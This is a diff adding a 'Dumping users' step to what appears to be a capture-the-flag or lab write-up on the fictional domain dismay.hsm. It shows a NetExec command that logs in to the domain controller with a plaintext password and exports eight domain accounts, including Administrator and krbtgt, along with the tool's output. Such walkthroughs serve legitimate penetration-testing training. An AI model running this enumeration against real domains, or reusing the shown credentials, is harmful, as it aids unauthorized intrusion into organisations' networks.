@@ -375,3 +375,20 @@ SMB         10.0.16.4       445    DC1              [+] dismay.hsm\guy.rookie:O0
 ```
 But the credentials work on the domain controller
 
+## Dumping users
+```python
+nxc smb dc1.dismay.hsm -u guy.rookie -p 'O0Aco9FQJQ' --users-export users.txt
+SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.16.4       445    DC1              [+] dismay.hsm\guy.rookie:O0Aco9FQJQ 
+SMB         10.0.16.4       445    DC1              -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.0.16.4       445    DC1              Administrator                 2026-02-05 09:16:49 0       Built-in account for administering the computer/domain 
+SMB         10.0.16.4       445    DC1              Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.0.16.4       445    DC1              krbtgt                        2025-12-12 11:50:45 0       Key Distribution Center Service Account 
+SMB         10.0.16.4       445    DC1              mike.silver                   2026-02-08 10:39:00 0        
+SMB         10.0.16.4       445    DC1              wang.kali                     2026-02-08 10:40:19 0        
+SMB         10.0.16.4       445    DC1              nadia.robin                   2026-02-08 10:39:15 0        
+SMB         10.0.16.4       445    DC1              jena.yamazaki                 2026-02-08 10:39:30 0        
+SMB         10.0.16.4       445    DC1              guy.rookie                    2026-02-08 10:39:43 0        
+SMB         10.0.16.4       445    DC1              [*] Enumerated 8 local users: DISMAY
+SMB         10.0.16.4       445    DC1              [*] Writing 8 local users to users.txt
+```
